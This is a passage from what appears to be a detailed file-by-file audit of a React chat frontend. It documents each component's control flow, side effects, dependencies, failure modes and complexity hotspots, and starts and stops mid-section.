`suppressErrorRendering: true` `:62` prevents mermaid's DOM error bomb. `downloadPng` `:216-220`
swallows every rasterisation failure and silently downloads an `.svg` instead of the promised
`.png` without telling the user. `img.onerror` `:213` rejects but there is **no timeout** — a
`blob:` image that never loads leaves the promise pending forever and the `finally` at `:221` never
runs.

**Concurrency** — `mermaidPromise` guards a single import, but **`mermaid.initialize` races**: N
blocks on screen each call `initialize` with the current theme before `render`. Same theme is
benign; a theme toggle mid-render can configure one theme and render another. `renderSeq` `:46` is
a shared mutable module counter (no id collisions). `cancelled` `:121` prevents post-unmount state
updates; the underlying render is not abortable.

**Complexity hotspots** — `MermaidBlock` `:107-429` = **323 LOC** (largest component function after
`ChatApp`); `getMermaid` `:49-105` = 57 LOC dominated by a 28-key `themeVariables` literal
`:73-102`; `downloadPng` `:162-224` = 63 LOC. Magic numbers: 480 px preview cap `:309`, `scale = 2`
`:191`, 10,000 ms revoke delay `:184`, 1.25 zoom step `:349`/`:361`, `innerWidth - 96` /
`innerHeight - 140` fit insets `:235`.

**Findings** — None. **Explicitly not an XSS finding**: `securityLevel: 'strict'` at `:58` routes
both `dangerouslySetInnerHTML` sites through mermaid's DOMPurify pass (§3c).

## ChartView.tsx
**Purpose** — Proof-drawer chart section: validate a `ChartSpec`, resolve the theme palette, build
the ECharts option, render it behind an error boundary.

**Public surface** — `export function ChartView({spec, data}: {spec: ChartSpec; data: DataRow[]})`
[`:81`](../../frontend/components/ChartView.tsx#L81). Module-local `ChartUnavailable({reason})`
`:39`, `const MESSAGES: Record<string,string>` `:43-52`, `ChartCanvas({spec,data})` `:54`.

**Control flow**
1. `ChartView` `:81-92` renders `<figure>`, an optional `<figcaption>` from `spec.title` `:84-86`,
   then `ChartErrorBoundary` wrapping `ChartCanvas` `:87-89`.
2. `ChartCanvas` `:54-79`: `useTheme()` `:55`, palette state seeded with `fallbackPalette(theme)`
   `:60`, re-resolved to real CSS tokens in an effect `:61-63`.
3. `validateChart(spec, data)` on **every render** `:65`; `buildChartOption` memoised `:66-69`.
4. A problem → `ChartUnavailable` with the mapped message `:71-73`; a null option → generic message
   `:74-76`; else `<EChart option height={300} ariaLabel={spec.title || 'Chart'} />` `:78`.

**State & side effects** — `useState` palette `:60`; `useEffect` `:61-63` calls `resolvePalette`,
which reads `window.getComputedStyle(document.documentElement)`
([`chartTheme.ts:87-103`](../../frontend/lib/chartTheme.ts#L87-L103)). No network, no storage.

**Dependencies** — Inbound: [`ProofDrawer.tsx:15`](../../frontend/components/ProofDrawer.tsx#L15).
Outbound: `next/dynamic` `:26`, `@/lib/types` `:27`, `@/lib/chartOption` `:28`, `@/lib/chartTheme`
`:29`, `./Providers` `:30`, `./ChartErrorBoundary` `:31`, dynamic `./EChart` `:34-37` with
`ssr: false`.

**Config** — None.

**Failure modes** — A throw inside ECharts is caught by `ChartErrorBoundary` `:87`;
`buildChartOption` itself never throws
([`chartOption.ts:320-326`](../../frontend/lib/chartOption.ts#L320-L326) wraps in try/catch and
returns `null`).

**Concurrency** — Synchronous render plus one effect.

**Complexity hotspots** — None. But `validateChart` is called **outside** `useMemo` `:65` and walks
every row × every key ([`chartOption.ts:99-116`](../../frontend/lib/chartOption.ts#L99-L116)) on
every re-render — O(rows) work per SSE token while a Data/Chart section is open, given the
`MessageRow` re-render storm. The 300 px height is hard-coded at `:36` and `:78`.

**Findings** — None specific.

## EChart.tsx
**Purpose** — The Apache ECharts canvas renderer, isolated so it is code-split and never
server-rendered.

**Public surface** — `export default function EChart({option, height = 300, ariaLabel}: {option: EChartsOption; height?: number; ariaLabel?: string})`
[`:57-65`](../../frontend/components/EChart.tsx#L57-L65). Module-local
`type ChartInstance = {resize: () => void}` `:42`.

**Control flow** — 1. Module scope registers exactly five series types plus four components and
`CanvasRenderer` via `echarts.use([...])` `:44-55` (a deliberate tree-shaking boundary). 2. A
`useEffect` `:72-78` attaches a `ResizeObserver` on the wrapper that calls
`chart.current?.resize()`. 3. Renders a `role="img"` wrapper `:80-87` and `ReactEChartsCore` with
`notMerge` + `lazyUpdate` `:88-100`, capturing the instance in `onChartReady` `:97-99`.

**State & side effects** — `ResizeObserver` `:75-77`, disconnected on unmount `:77`. Canvas drawing
only, no network.

**Dependencies** — Inbound: **dynamic only** —
[`ChartView.tsx:34`](../../frontend/components/ChartView.tsx#L34)
(`dynamic(() => import('./EChart'), {ssr: false})`). `rg` finds no static import, which is the
point. Outbound: `echarts-for-react/lib/core` `:23`, `echarts/core` `:24`, `echarts/charts` `:25-31`,
`echarts/components` `:32-37`, `echarts/renderers` `:38`, `@/lib/chartOption` (type only) `:39`.

**Config** — None.

**Failure modes** — `typeof ResizeObserver === 'undefined'` guard `:74`. If `onChartReady` never
fires, resize is a silent no-op. No error handling around ECharts itself — that is
`ChartErrorBoundary`'s job.

**Concurrency** — Synchronous; the `ResizeObserver` callback is **not debounced**, so a drag-resize
of the proof drawer issues a `resize()` per animation frame.

**Complexity hotspots** — None. The `height` default `300` is duplicated at `:59` and at the call
site [`ChartView.tsx:78`](../../frontend/components/ChartView.tsx#L78).

**Findings** — None.

## ChartErrorBoundary.tsx
**Purpose** — The application's **only** React error boundary, scoped to a single chart.

**Public surface** — `export class ChartErrorBoundary extends Component<Props, State>`
[`:28`](../../frontend/components/ChartErrorBoundary.tsx#L28);
`interface Props {children: ReactNode; fallback?: ReactNode}` `:18-22`;
`interface State {failed: boolean}` `:24-26`; `static getDerivedStateFromError(): State` `:31`;
`componentDidCatch(error, info)` `:35`; `render()` `:47`.

**Control flow** — A throw below it → `getDerivedStateFromError` sets `failed` `:31-33` → `render`
returns `this.props.fallback` or the default notice `:48-55`.

**State & side effects** — `console.error` only when `process.env.NODE_ENV !== 'production'`
`:41-44`. No telemetry, by design `:36-40`.

**Dependencies** — Inbound:
[`ChartView.tsx:31`](../../frontend/components/ChartView.tsx#L31). Outbound: `react` `:16`.

**Config** — `NODE_ENV` at `:41`.

**Failure modes** — **No reset path**: once `failed` is `true` it never returns to `false` (`:29`,
`:47-48`). A transient failure — e.g. a resize race — permanently blanks that chart until the
message unmounts. The fallback copy `:51-53` duplicates
[`ChartView.tsx:75`](../../frontend/components/ChartView.tsx#L75) verbatim.

**Concurrency** — Synchronous.

**Complexity hotspots** — None.

**Findings** — None assigned. Architecturally the important fact is the **scope**: charts are the
only subtree with a boundary; the rest of the message tree is unguarded (see `MessageRow`).

## DataTable.tsx
**Purpose** — Proof-drawer Data section: a sortable HTML table over `DataRow[]` with client-side CSV
export.

**Public surface** — `export function DataTable({rows, truncated, csvName}: {rows: DataRow[]; truncated?: boolean; csvName: string})`
[`:24-32`](../../frontend/components/DataTable.tsx#L24-L32). Module-local
`type SortDir = 'asc' | 'desc'` `:13`, `compareValues(a, b)` `:15`.

**Control flow** — 1. `columns` = union of every row's keys, memoised `:36-45`. 2. `sorted`
`:47-51`: `[...rows].sort(compareValues)` then `.reverse()` for descending. 3. `toggleSort`
`:53-60`. 4. Empty guard `:62-64`. 5. Header row `:85-116` with `aria-sort` `:92-98` and a
full-width sort `<button>`. 6. Body `:117-142`: numeric-looking cells right-aligned monospace
`:122-130`, `null`/`undefined` → em dash `:132-134`, everything else `String(v)` `:135`
(React-escaped).

**State & side effects** — `downloadCsv(rows, csvName)` `:76` → Blob + object URL + synthetic anchor
click ([`csv.ts:27-39`](../../frontend/lib/csv.ts#L27-L39)). No network.

**Dependencies** — Inbound: [`ProofDrawer.tsx:14`](../../frontend/components/ProofDrawer.tsx#L14).
Outbound: `@/lib/types` `:9`, `@/lib/csv` `:10`, `./icons` `:11`.

**Config** — None.

**Failure modes** — Nothing thrown. `Number(v)` coercion at `:20` and `:124` means numeric-looking
**strings** sort and align as numbers, and `Number(true) === 1` right-aligns booleans `:122-124`.
Descending sort is ascending + `.reverse()` `:49-50`, which inverts the relative order of equal keys
— not a stable descending sort.

**Concurrency** — Synchronous.

**Complexity hotspots** — `DataTable` `:24-147` = 124 LOC but almost entirely JSX. **No
virtualisation**: the orchestrator can send 500 rows (the `truncated` copy at `:70-72` says so) and
every one is a DOM `<tr>` re-rendered on every `ChatApp` re-render.

**Findings** — None assigned. `csvName` is hard-coded to `"techsara-data"` by the only caller
([`ProofDrawer.tsx:147`](../../frontend/components/ProofDrawer.tsx#L147)), so every export
overwrites the same filename; CSV formula injection lives in `lib/csv.ts` (§3).

## ProofDrawer.tsx
**Purpose** — The signature "proof" bar under an assistant answer: engine badge plus collapsible
SQL / Sources / Web sources / Code / Data / Chart / Files sections.

**Public surface** — `export function ProofDrawer({meta}: {meta: Meta})`
[`:36`](../../frontend/components/ProofDrawer.tsx#L36). Module-local `type SectionId` `:22-29`,
`interface Section` `:31-34`.

**Control flow** — 1. `sections` built imperatively from `meta` `:37-67`, with counts in the labels.
2. `chartRows = meta.chart_data?.length ? meta.chart_data : meta.data` `:61` — the back-compat
fallback for conversations persisted before `chart_data` existed. 3. `open` state initialised once —
chart auto-opens, else files `:69-78`. 4. Early return when there is nothing to show `:80`.
5. `toggle` `:82-89`; header `:93-123`; panels `:125-157` dispatching to `SqlBlock` `:133`,
`CitationChips` `:135`, `WebSources` `:138`, `CodeCitations` `:141`, `DataTable` `:144-148`,
`ChartView` `:151`, `FileCards` `:154`.

**State & side effects** — `useState<Set<SectionId>>` only. No network, no storage.

**Dependencies** — Inbound: [`MessageRow.tsx:15`](../../frontend/components/MessageRow.tsx#L15).
Outbound: `@/lib/types` `:11`, `./EngineBadge` `:12`, `./SqlBlock` `:13`, `./DataTable` `:14`,
`./ChartView` `:15`, `./CitationChips` `:16`, `./WebSources` `:17`, `./CodeCitations` `:18`,
`./FileCards` `:19`, `./icons` `:20`.

**Config** — None.

**Failure modes** — Nothing thrown; an unknown `meta.route` degrades inside `EngineBadge`
([`EngineBadge.tsx:63-64`](../../frontend/components/EngineBadge.tsx#L63-L64)). The `open`
initialiser `:69-78` runs once, so a message whose meta arrives in two steps keeps the first
computation.

**Concurrency** — Synchronous.

**Complexity hotspots** — `ProofDrawer` `:36-160` = 124 LOC; the section-building block `:37-78` is
42 LOC of straight-line conditionals.

**Findings** — None assigned. UX defect worth recording: two different section ids both render the
label `Sources (n)` (`:40` for Salesforce citations, `:44-46` for web sources), so a message with
both shows two identically-labelled buttons.

## Sidebar.tsx
**Purpose** — The 260 px conversation rail: pinned / recents / archived sections, inline rename,
per-row `⋯` menu, theme toggle; collapsible on desktop and a slide-over on mobile.

**Public surface** — private `interface SidebarProps {open; onClose; conversations; archived; activeId; streamingIds?; onNewChat; onOpenSearch; onSelect; onRename; onDelete; onSetPinned; onSetArchived; onExport; onLoadArchived}`
[`:33-54`](../../frontend/components/Sidebar.tsx#L33-L54); `export function Sidebar({...})` `:56-72`.

**Control flow** — 1. Local state `editingId`, `draftTitle`, `archivedOpen` `:73-75`;
`archivedLoaded` ref `:76`. 2. `pinned`/`recents` partition `:79-80`. 3. `commitRename` `:82-85`;
`toggleArchived` `:87-94` fires `onLoadArchived()` exactly once `:90-93`. 4. `row(c)` `:96-167`:
inline `<input>` while editing `:99-114`, else the select button `:117-144` (spinner when
`streamingIds.includes(c.id)` `:137-143`) plus the `ConversationMenu` `:145-162` wired through
`conversationMenuHandlers` `:151-160`. 5. `body` `:169-291`: header `:171-191`, New chat `:193-205`,
`<nav>` `:207-274` with Pinned `:219-229`, Recents `:231-243`, Archived disclosure `:245-273`, theme
toggle `:276-289`. 6. Return `:293-324`: the desktop `<aside>` `:296-304` **and** the mobile
slide-over `:307-322`, both rendering `body`.

**State & side effects** — `toggleTheme()` from `useTheme` `:77`/`:279`, which writes
`localStorage['techsara.theme']` ([`Providers.tsx:74`](../../frontend/components/Providers.tsx#L74)).
Nothing else.

**Dependencies** — Inbound: [`ChatApp.tsx:63`](../../frontend/components/ChatApp.tsx#L63).
Outbound: `@/lib/conversationMenu` `:17`, `@/lib/types` `:18`, `./ConversationMenu` `:19`,
`./TechSaraMark` `:20`, `./Providers` `:21`, `./icons` `:22-31`.

**Config** — None.

**Failure modes** — `commitRename` `:83` passes the **untrimmed** `draftTitle` to `onRename`; the
store trims at [`history.ts:259-264`](../../frontend/lib/history.ts#L259-L264), so this is a
redundant guard, not a data issue. The Archived disclosure only renders when `archived.length > 0`
`:245`, and `archived` comes from the local cache
([`ChatApp.tsx:135`](../../frontend/components/ChatApp.tsx#L135) →
[`history.ts:237-239`](../../frontend/lib/history.ts#L237-L239)), while `onLoadArchived` — which
pulls `?archived=true` — can only fire from **inside** that section `:250`. A conversation archived
on another device is therefore invisible until some other path caches it.

**Concurrency** — Synchronous.

**Complexity hotspots** — `Sidebar` `:56-325` = **270 LOC**; `row` `:96-167` = 72 LOC; the `body`
expression `:169-291` = 123 LOC.

**Findings** — None assigned. Two structural defects worth recording: (a) **`body` renders twice
whenever `open` is true** (`:303` and `:319`) — the desktop aside is only CSS-hidden
(`hidden … md:block` `:297`) and the drawer only `md:hidden` `:308`, so both subtrees are in the DOM
at every viewport, duplicating the ids `sidebar-pinned` `:222`, `sidebar-recents` `:235`,
`sidebar-archived-list` `:266` and every row's `ConversationMenu`; (b) `aria-hidden={!open}` on the
desktop aside `:301` while the collapsed aside (`w-0` `:298`) still contains tabbable buttons.

## ContextMeter.tsx
**Purpose** — The context-usage ring beside the send button, with a portalled breakdown popover and
a "Compact now" action.

**Public surface** — private `interface ContextMeterProps {view: MeterView; compacting: boolean; onCompactNow: () => void; compactDisabled?: boolean}`
[`:28-33`](../../frontend/components/ContextMeter.tsx#L28-L33); `export function ContextMeter({...})`
`:35-40`. Constants `SIZE = 18` `:23`, `STROKE = 2.5` `:24`, `RADIUS` `:25`, `CIRCUMFERENCE` `:26`.

**Control flow** — 1. `useLayoutEffect` `:46-55` measures the trigger and positions the popover
(`left = max(12, rect.right - 280)`, `bottom = innerHeight - rect.top + 8`). 2. Dismissal effect
`:57-71`: Escape `:59-61` and `pointerdown` `:62-64`. 3. Ring `:99-127` with `strokeDasharray` from
`view.fraction` `:73`. 4. Popover portal `:133-199`: breakdown rows `:148-178`, total `:179-185`,
"Compact now" `:186-196`.

**State & side effects** — `createPortal(document.body)` `:136`; two `document` listeners `:65-66`.

**Dependencies** — Inbound: [`ChatApp.tsx:57`](../../frontend/components/ChatApp.tsx#L57).
Outbound: `react-dom` `:16`, `@/lib/contextMeter` `:17-21`.

**Config** — None.

**Failure modes** — **The outside-click guard checks only `buttonRef`** `:62-64`. The popover is
portalled to `<body>` and is therefore never "inside" the button, so any `pointerdown` within the
popover — including on "Compact now" `:186` — sets `open = false` and unmounts the panel between
`pointerdown` and `click`. The `onClick={(e) => e.stopPropagation()}` at `:142` is a React synthetic
handler and cannot stop the native `document` listener.
[`ConversationMenu.tsx:169-175`](../../frontend/components/ConversationMenu.tsx#L169-L175) is the
correct pattern (it checks the portalled panel *and* the trigger) and this file does not follow it.

**Concurrency** — Synchronous.

**Complexity hotspots** — `ContextMeter` `:35-202` = 168 LOC. Magic numbers: 280 px popover width
`:51`/`:140`, 12/8 px insets `:51-52`.

**Findings** — `TEST-02` — a `node`-environment, `.test.ts`-only Vitest config cannot catch a
portal/pointer-event defect of this shape.

## AgentTimeline.tsx
**Purpose** — The numbered agent step list (running / done / failed), expandable per step.

**Public surface** — `export function AgentTimeline({steps}: {steps: AgentStep[]})`
[`:38`](../../frontend/components/AgentTimeline.tsx#L38). Module-local `StatusIcon({status})` `:14`.

**Control flow** — Empty guard `:42`; `toggle(id)` over a `Set<number>` `:44-51`; header `:55-61`;
`<ol>` mapping each step `:62-115` with an expandable `<button>` when `step.detail` exists `:83-98`
and a plain `<span>` otherwise `:99-103`; the detail paragraph `:104-111`.

**State & side effects** — `useState<Set<number>>` `:39`, `useId` `:40`. Nothing external.

**Dependencies** — Inbound: [`MessageRow.tsx:11`](../../frontend/components/MessageRow.tsx#L11).
Outbound: `@/lib/types` `:11`, `./icons` `:12`.

**Config** — None. Consumes the CSS var `--ts-engine-agent-ink` `:58`, defined at
[`globals.css:56`](../../frontend/app/globals.css#L56) / `:105`.

**Failure modes** — `key={step.id}` `:82` assumes unique ids; duplicate ids from a malformed
`meta.steps` produce React key warnings and mis-toggled panels. Step payloads are validated on the
wire ([`sse.ts:137-165`](../../frontend/lib/sse.ts#L137-L165)) but **not** when replayed from
persisted history, where `meta` is cast unchecked.

**Concurrency** — Synchronous.

**Complexity hotspots** — `AgentTimeline` `:38-118` = 81 LOC, JSX-heavy.

**Findings** — None.

## ResearchPanel.tsx
**Purpose** — Collapsible panel showing the searches behind an answer: source count, elapsed time,
top domains, and every query with its results.

**Public surface** — `export function formatElapsed(ms: number): string`
[`:25`](../../frontend/components/ResearchPanel.tsx#L25);
`export function countSources(research: Research): number` `:33`;
`export function rankDomains(research: Research): {domain: string; count: number}[]` `:42-44`;
`export function ResearchPanel({research}: {research: Research})` `:157`. Module-local
`TOP_DOMAINS = 4` `:60`, `DomainBars({research})` `:62`, `QueryGroup({query, results})` `:104`.

**Control flow** — 1. `ResearchPanel` `:157-213` hides itself when there are no sources and no
active work `:160`; header button `:167-197`; expanded body `:199-210` renders `DomainBars` `:201`
then one `QueryGroup` per query `:206-208`. 2. `DomainBars` `:62-102`: memoised ranking `:63`, top
4 `:65`, remainder summarised `:94-99`. 3. `QueryGroup` `:104-155`: local open state `:111`, result
list with external links `:132-152`.

**State & side effects** — None beyond local `useState`. Links carry
`target="_blank" rel="noopener noreferrer"` `:138-139`.

**Dependencies** — Inbound: [`MessageRow.tsx:12`](../../frontend/components/MessageRow.tsx#L12).
Outbound: `@/lib/types` `:16`, `./icons` `:17-22`.

**Config** — None.

**Failure modes** — `ResearchPanel` **assumes `research.queries` is an array** (`:159`, `:203`,
`:206`). That value comes from `meta.research`, which round-trips through server history untyped
([`types.ts:151`](../../frontend/lib/types.ts#L151);
[`history.ts:570`](../../frontend/lib/history.ts#L570) casts `m.meta as Meta`), so a malformed
stored payload throws **inside render** — and with no error boundary in the message tree that blanks
the whole app. `QueryGroup` keys on `q.query` `:207`, so two identical query strings collide.

**Concurrency** — Synchronous.

**Complexity hotspots** — `ResearchPanel` `:157-213` = 57 LOC; `QueryGroup` `:104-155` = 52 LOC.

**Findings** — None assigned. `href={r.url}` `:137` is backend/model-supplied; safe from
`javascript:` because of React 19 (§3b), but it is a genuine outbound navigation target.

## SearchPalette.tsx
**Purpose** — Ctrl/Cmd+K modal search over conversations; a thin rendering shell over
`lib/searchPalette`.

**Public surface** — `export interface SearchPaletteProps {open; onClose; recents: ConversationSummary[]; onSelect(id); onNewChat(); searchFn?}`
[`:63-72`](../../frontend/components/SearchPalette.tsx#L63-L72);
`export function SearchPalette({...})` `:78-85`. Module-local `const FOCUSABLE` `:58-59`,
`type SearchStatus` `:61`, `defaultSearch(query, signal)` `:74-76`.

**Control flow**
1. `runSearch` `:107-132`: abort the previous controller `:109`, create a new one `:110-111`,
   `setStatus('loading')` `:112`, await `searchFn` `:115`, parse via `parseSearchResults` `:117`; an
   abort is ignored `:118`/`:123`, any other error sets `status='error'` with empty results
   `:124-125`.
2. A single `createDebounce` instance is created lazily and kept for the palette's life `:139-147`,
   reading the latest `runSearch` through `runSearchRef` `:137-138`.
3. Query effect `:149-169`: closing cancels the debounce and aborts `:151-157`; an empty query
   resets `:158-167`; otherwise `debounce.run(trimmed)` `:168`. Unmount cleanup `:172-179`.
4. Open effect `:183-195`: remember `document.activeElement` `:185`, reset state `:187-190`, focus
   the input with `preventScroll` `:191`, restore focus on close unless a row was activated
   `:192-194`.
5. Model `:199-213`: empty query → `resultsFromSummaries(recents)`, else the latest server results;
   `highlighted` clamped `:213`. Highlight scrolling touches **only** the list element `:217-231`.
6. `activate` `:235-244`; keyboard `:248-277` (Tab trap `:248-258`, `paletteKeyAction` dispatch
   `:265-276`).
7. Render `:281-448`: `null` when closed `:281`, else a portal to `document.body` `:353`, backdrop
   `:357-361`, `role="dialog"` panel `:363-370`, combobox input `:377-395`, `role="listbox"`
   `:406-444`.

**State & side effects** — Network: `searchConversations` → `GET /api/history/search?q=…`
([`historyApi.ts:237`](../../frontend/lib/historyApi.ts#L237)). DOM:
`createPortal(document.body)` `:353`, `focus({preventScroll: true})` `:191`/`:193`/`:256`, direct
`list.scrollTop` writes `:227`/`:229`. One `AbortController` per search `:110`.

**Dependencies** — Inbound: [`ChatApp.tsx:62`](../../frontend/components/ChatApp.tsx#L62).
Outbound: `react-dom` `:38`, `@/lib/historyApi` `:39`, `@/lib/searchPalette` `:40-53`,
`@/lib/types` `:54`, `./icons` `:55`.

**Config** — None.

**Failure modes** — Every search failure collapses to one inline line `:434-438`; the HTTP status is
discarded. No retry. `SEARCH_MAX_QUERY` (100) is enforced twice — `maxLength` `:390` and
`normalizeQuery` `:103` — matching the server's `_MAX_QUERY_LENGTH`
([`orchestrator/app/history.py:35`](../../orchestrator/app/history.py#L35)).

**Concurrency** — One `AbortController` at a time `:94`/`:109`; superseded requests abort. The
`finally` at `:126-128` only nulls the ref when it is still the current controller — correct.

**Complexity hotspots** — `SearchPalette` `:78-449` = **372 LOC**; `renderRow` `:288-345` = 58 LOC.
`onMouseMove` on every row (`:299`, `:318`) calls `setActiveIndex` on each mouse-move event with no
equality guard, re-rendering the whole palette.

**Findings** — None assigned. This is the **only** component in the app that uses `AbortController`
correctly; contrast `ChatApp.compactNow`, `SummaryPanel` and every `app/api` route.

## ConversationMenu.tsx
**Purpose** — The per-row `⋯` popover (Rename · Pin · Archive · Export · Delete with inline
confirm), portalled and fixed-positioned.

**Public surface** — `export interface ConversationMenuProps {title; pinned; archived; active?; onRename; onTogglePin; onToggleArchive; onExport; onDelete; onOpenChange?}`
[`:59-73`](../../frontend/components/ConversationMenu.tsx#L59-L73);
`export function ConversationMenu({...})` `:98-109`. Module-local `MENU_WIDTH = 208` `:50`,
`useMeasureEffect` `:53-54`, `CONFIRM_FOCUS_INDEX = 1` `:57`, `itemIcon(id, pinned, archived)`
`:75-96`.

**Control flow** — 1. `items = conversationMenuItems({pinned, archived}, confirmingDelete)` `:119`.
2. `close(restoreFocus)` `:121-130`; `openMenu()` `:132-138`. 3. Placement measured before paint
`:143-161` via `placeMenu`
([`conversationMenu.ts:208-236`](../../frontend/lib/conversationMenu.ts#L208-L236)). 4. Dismissal
effect `:165-199`: `pointerdown` outside **both** menu and trigger `:167-176`, Escape `:177-179`,
resize/scroll in capture phase `:180-192`. 5. Roving focus `:202-207` with `preventScroll`.
6. `activate(id)` `:209-231` maps the pure outcome to state; rename and delete-confirm deliberately
do not restore focus `:230`. 7. Keyboard `:233-249`. 8. Render `:251-326`: trigger `:253-268`,
portal `:275-324`.

**State & side effects** — `createPortal(document.body)` `:276`; document/window listeners
`:188-192`, removed on cleanup `:193-198`; `focus()` calls `:127`/`:206`.

**Dependencies** — Inbound: [`Sidebar.tsx:19`](../../frontend/components/Sidebar.tsx#L19).
Outbound: `react-dom` `:28`, `@/lib/conversationMenu` `:29-36`, `./icons` `:37-48`.

**Config** — None.

**Failure modes** — Nothing thrown. `itemRefs.current` `:117` is never truncated when the item list
shrinks from 5 to 2 `:296-321`, leaving stale detached refs at indices 2–4 (harmless because
`focusIndex` is reset).

**Concurrency** — Synchronous plus effects. No module-level shared state.

**Complexity hotspots** — `ConversationMenu` `:98-327` = **230 LOC**. Magic number
`MENU_WIDTH = 208` `:50`.

**Findings** — None. Reference implementation for the outside-click pattern that `ContextMeter`
gets wrong.

## SummaryPanel.tsx
**Purpose** — Read-only modal showing the rolling compaction summary for a conversation.

**Public surface** — private `interface SummaryPanelProps {conversationId: string | null; open: boolean; onClose: () => void}`
[`:17-21`](../../frontend/components/SummaryPanel.tsx#L17-L21);
`export function SummaryPanel({...})` `:23-27`.

**Control flow** — 1. Fetch effect `:32-54`: `GET /api/history/conversations/{id}/summary` with
`cache: 'no-store'` `:38-41`, `!res.ok` → throw `:42`, body parsed `:43`, state set `:44-46`; any
failure → `{kind: 'error'}` `:47-49`. 2. Escape handler `:56-63`. 3. Portal `:67-121` with
backdrop click-to-close `:71` and `stopPropagation` on the panel `:76`.

**State & side effects** — Network egress to `/api/history/...` `:38`;
`createPortal(document.body)` `:67`.

**Dependencies** — Inbound: [`ChatApp.tsx:58`](../../frontend/components/ChatApp.tsx#L58).
Outbound: `react-dom` `:14`, `./icons` `:15`.

**Config** — None.

**Failure modes** — Bare `catch {}` `:47` collapses 404 / 500 / network into one message `:98-100`.
No `AbortController` — a slow request from a previous open is only neutralised by the `cancelled`
flag `:51-53`; the socket stays open. No timeout, no retry.

**Concurrency** — One in-flight request; `cancelled` guard `:34`/`:44`/`:48`.

**Complexity hotspots** — `SummaryPanel` `:23-122` = 100 LOC.

**Findings** — `OBS-01`. This is the **only** component that calls `/api/history` directly instead
of going through [`lib/historyApi.ts`](../../frontend/lib/historyApi.ts), and the corresponding
orchestrator route `GET /history/conversations/{id}/summary`
([`orchestrator/app/history.py:239`](../../orchestrator/app/history.py#L239)) has no other frontend
caller.

## Providers.tsx
**Purpose** — App-wide theme and toast context; the root of the client component tree.

**Public surface** — `export function useTheme(): ThemeContextValue`
[`:46`](../../frontend/components/Providers.tsx#L46);
`export function useToast(): ToastContextValue` `:50`;
`export function Providers({children}: {children: ReactNode})` `:54`. Types `Theme` `:20`,
`ThemeContextValue` `:22-25`, `Toast` `:27-31`, `ToastContextValue` `:33-35`.

**Control flow** — 1. Contexts created with dark/no-op defaults `:37-44`. 2. Mount effect reads the
class stamped by the pre-hydration script `:59-64`. 3. `toggleTheme` `:66-80` swaps the `html`
classes, sets `colorScheme`, writes `localStorage['techsara.theme']` `:74`. 4. `toast(text, tone)`
`:82-88` pushes and auto-removes after 5,200 ms `:85-87`. 5. Renders both providers plus the
`aria-live="polite"` toast stack `:90-117`.

**State & side effects** — `localStorage.setItem('techsara.theme', …)` `:74` inside try/catch
`:73-77`; `document.documentElement` class + style mutation `:69-72`; `setTimeout` `:85`.

**Dependencies** — Inbound: [`layout.tsx:13`](../../frontend/app/layout.tsx#L13) (the provider);
`useToast` in [`ChatApp.tsx:64`](../../frontend/components/ChatApp.tsx#L64) and
[`Composer.tsx:32`](../../frontend/components/Composer.tsx#L32); `useTheme` in
[`ChartView.tsx:30`](../../frontend/components/ChartView.tsx#L30),
[`Sidebar.tsx:21`](../../frontend/components/Sidebar.tsx#L21),
[`MermaidBlock.tsx:31`](../../frontend/components/MermaidBlock.tsx#L31). Outbound: `react` only
`:10-18`.

**Config** — None.

**Failure modes** — Storage failure swallowed `:75-77`. The `setTimeout` at `:85` is never cleared,
so a toast scheduled just before unmount still fires `setToasts` (harmless in React 18+), and a
burst of 20 toasts in 5 s all stack in the fixed container `:94-98`.

**Concurrency** — `nextToastId` ref `:57`/`:83` is monotonic; concurrent toasts are safe.

**Complexity hotspots** — None. `z-[70]` `:97` is the highest z-index in the app, tied with
[`ConfirmDialog.tsx:52`](../../frontend/components/ConfirmDialog.tsx#L52).

**Findings** — None.

---

## 6. Components — presentational (14 files, 1,272 LOC)

These 14 files are pure or near-pure render units with no network, no storage, no shared mutable
module state, and no `Config` beyond the `NODE_ENV`-free defaults. They are documented as one block
because each has an identical shape for eight of the ten schema sections.

**Purpose** — Leaf presentation: engine identity, code/SQL/citation rendering, small controls, the
icon set.

**Public surface**

| File | LOC | Export(s) | `file:line` |
|---|---:|---|---|
| [`ModelPicker.tsx`](../../frontend/components/ModelPicker.tsx) | 144 | `ModelPicker({model, effort, onChange})` | `:47-55` |
| [`ConfirmDialog.tsx`](../../frontend/components/ConfirmDialog.tsx) | 91 | `ConfirmDialog({open, title, body, confirmLabel?, onConfirm, onCancel})` | `:24-31` |
| [`EngineBadge.tsx`](../../frontend/components/EngineBadge.tsx) | 89 | `engineAccent(engine)` `:50`; `EngineBadge({engine, size='sm'})` | `:54-60` |
| [`ReasoningAccordion.tsx`](../../frontend/components/ReasoningAccordion.tsx) | 87 | `ReasoningAccordion({text, seconds, thinking})` | `:25-34` |
| [`SqlBlock.tsx`](../../frontend/components/SqlBlock.tsx) | 76 | `SqlBlock({sql})` | `:43` |
| [`PastedChip.tsx`](../../frontend/components/PastedChip.tsx) | 68 | `PastedChip({pasted, onRemove})` | `:15-21` |
| [`CodeCitations.tsx`](../../frontend/components/CodeCitations.tsx) | 49 | `CodeCitations({sources})` | `:13` |
| [`CopyButton.tsx`](../../frontend/components/CopyButton.tsx) | 49 | `CopyButton({text, label, className=''})` | `:6-14` |
| [`FileCards.tsx`](../../frontend/components/FileCards.tsx) | 47 | `FileCards({files})` | `:10` |
| [`WebSources.tsx`](../../frontend/components/WebSources.tsx) | 43 | `WebSources({sources})` | `:13` |
| [`CitationChips.tsx`](../../frontend/components/CitationChips.tsx) | 35 | `CitationChips({citations})` | `:9` |
| [`EmptyState.tsx`](../../frontend/components/EmptyState.tsx) | 19 | `EmptyState()` | `:10` |
| [`TechSaraMark.tsx`](../../frontend/components/TechSaraMark.tsx) | 19 | `TechSaraMark({size=56})` | `:7` |
| [`icons.tsx`](../../frontend/components/icons.tsx) | 287 | 34 icon components + `base(size, className)` | `:8-21`, `:23-286` |

**Control flow** — All are single-expression renderers with at most one local `useState`.
Non-obvious paths: `ModelPicker.pick` `:80-85` always emits `onChange('smart', nextEffort)` and
`void model;` `:87` deliberately discards the `model` prop; `SqlBlock.tokenizeSql` `:24-41` runs one
global regex classifying comments/strings/numbers/identifiers; `CopyButton` `:19-30` tries
`navigator.clipboard.writeText` then falls back to a hidden `<textarea>` +
`document.execCommand('copy')`; `EngineBadge` `:63-64` falls back to the Chat style and prints the
raw route for an unknown engine.

**State & side effects** — `ConfirmDialog` `:44` and `ModelPicker` `:72-73` add `document`
listeners (removed on cleanup); `ConfirmDialog` `:50` portals to `document.body`; `CopyButton`
writes the clipboard `:19` and appends a transient `<textarea>` to `document.body` `:24`;
